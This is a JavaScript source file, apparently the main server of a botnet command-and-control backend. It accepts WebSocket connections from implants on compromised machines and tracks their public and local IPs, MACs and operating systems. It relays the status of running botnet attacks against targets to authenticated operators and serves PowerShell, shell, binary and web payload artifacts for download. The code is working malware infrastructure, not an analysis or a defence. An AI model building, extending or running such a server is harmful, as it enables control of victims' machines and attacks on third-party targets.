import express from 'express'
import { configDotenv } from 'dotenv';
import authRouter from './routes/auth_routes.mjs';
import helmet from 'helmet';
import { syntax_errors, type_errors } from './middlewares/json_errors.mjs';
import db_connection from './database/config.mjs';
import { WebSocketServer } from 'ws';
import http from 'http'
import cmd_router from './routes/cmd_routes.mjs';
import implant_router from './routes/implant_routes.mjs';
import artifacts_router from './routes/artifacts_routes.mjs';
import Implant from './models/Implant_model.mjs';
import cors from 'cors';
import jwt from 'jsonwebtoken';
import path from 'path';
import { fileURLToPath } from 'url';
import { readLastLines, writeLog } from './routes/writeLog.mjs';
import sanitize from './middlewares/sanitize.mjs';




const webSocketsServer = async (httpServer, attacks_running) => {
  try {
    const server = new WebSocketServer({ server: httpServer });
    const agents = new Map();   // Mapa de agents conectados (por ID)
    const users = new Set();  // Set de users conectados (frontends)
    const events = [];
    

    server.on('connection', (socket, request) => {
      const url = new URL(request.url, `http://${request.headers.host}`);
      const clientId = url.searchParams.get('id');
      const rol = url.searchParams.get('rol');
      const token = url.searchParams.get('token');


      if (rol === 'user') {
        try {
          const decoded = jwt.verify(token, process.env.SEED); // valida y decodifica el JWT

          users.add(socket);

          socket.on('close', () => {
            users.delete(socket);
          });

        } catch (err) {
          console.log('Invalid JWT', err.message);
          socket.send('invalid')
          socket.close(); // cerrar conexión si el token es inválido
        }

        return;
      }



      // Si es Agent
      if (!clientId) {
        console.log("Client with no ID, closing..");
        socket.close();
        return;
      }

      

      if (agents.has(clientId)) {
        writeLog(`Agent ${clientId} already connected replacing connection.`)
        agents.get(clientId).terminate();
      }
      
      writeLog(` | Agent connected with ID: ${clientId}`)
      
      events.push();
      
      socket.isAlive = true;
      agents.set(clientId, socket);
      
      //------------------------Datos proveniente de implantes-------------------------
      socket.on('message', (data) => {
        const data_parsed = JSON.parse(data);
          
        
          if(!data_parsed.error) {
            
            if(data_parsed.status === 'attack_completed') {
              // Filtrar para REMOVER el ataque completado
              // Si el mensaje del implante falla, el controller limpia el estado de running_attacks en el backend
               writeLog(` | Botnet ${data_parsed.attack_type} attack completed`)
               attacks_running.attacks = attacks_running.attacks.filter(a => 
                      a.attack_type !== data_parsed.attack_type || 
                      a.target !== data_parsed.target
                    ); 
                  } else if(data_parsed.status === 'attack_running') {
                    writeLog(` | Botnet ${data_parsed.attack_type} attack running`)
                    // Solo agregar si es un nuevo ataque
                  const exists = attacks_running.attacks.some(a => 
                      a.attack_type === data_parsed.attack_type && 
                      a.target === data_parsed.target
                  );
                  
                  if(!exists) {
                      attacks_running.attacks.push(data_parsed);
                  }
              }
          }
      });

      socket.on('pong', () => socket.isAlive = true);


      socket.on('close', () => {
        writeLog(` | Agent ${clientId} disconnected`)
        agents.delete(clientId);
      });
    });

    const interval = setInterval(async () => {
      const db_clients = await Implant.find(); 

      
      const client_db_list = db_clients.map(x => x);
      const status_connections = [];



      client_db_list.forEach((c) => {
        /* console.log("db:",c.impl_id); */
        
        //Agents status
        const ws = agents.get(c.impl_id);
        if (ws) {
          if (ws.isAlive) {
            status_connections.push({ id: c.impl_id, status: 'active', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system });
          } else {
            status_connections.push({ id: c.impl_id, status: 'inactive', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system });
          }
        } else {
          status_connections.push({ id: c.impl_id, status: 'inactive', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system });
        }
      });

      
      
      // Enviar estados a todos los users conectados
      const payload = {
        data: status_connections,
        botnet: attacks_running.attacks,
        events: readLastLines()
      };
      
      
    // Reenviar a todos los users
    users.forEach(userSocket => {
      if (userSocket.readyState === userSocket.OPEN) {
        userSocket.send(JSON.stringify(payload));
      }
    });
    }, 2000);

    server.on("close", () => clearInterval(interval));


    return { agents };

  } catch (error) {
    console.error('Error in websocket server', error);
    return false;
  }
};


const main = async () =>{

    const __filename = fileURLToPath(import.meta.url);
    const __dirname = path.dirname(__filename);
    
    configDotenv();
    const app = express();
    await db_connection();
    app.use(cors());
    
    app.use(helmet());

    let attacks_running={attacks:[]};
    
    app.use(express.json())
    app.use(express.urlencoded({ extended: true })); // Para formularios HTML

    app.use('/api/arts/js',express.static(path.join(__dirname, 'public/arts/js/') ));
    app.use('/api/arts/power', express.static(path.join(__dirname, 'public/arts/power/') ));
    app.use('/api/arts/sh', express.static(path.join(__dirname, 'public/arts/sh/') ));
    app.use('/api/arts/bin', express.static(path.join(__dirname, 'public/arts/bin/') ));
    app.use('/api/arts/web', express.static(path.join(__dirname, 'public/arts/web/') ));

    const server = http.createServer(app);
    const {agents} = await webSocketsServer(server, attacks_running)
    
    app.use('/api/auth', sanitize, authRouter)
    app.use('/api/rcv', cmd_router(agents, attacks_running))
    app.use('/api/impl', sanitize, implant_router())
    app.use('/api/artifacts', sanitize,artifacts_router())
    //------Type errors-----
    app.use(type_errors);
    app.use(syntax_errors);
    
    server.listen(process.env.PORT, '0.0.0.0', ()=> console.log(`Listening in port:  ${process.env.PORT}`))

}
main()
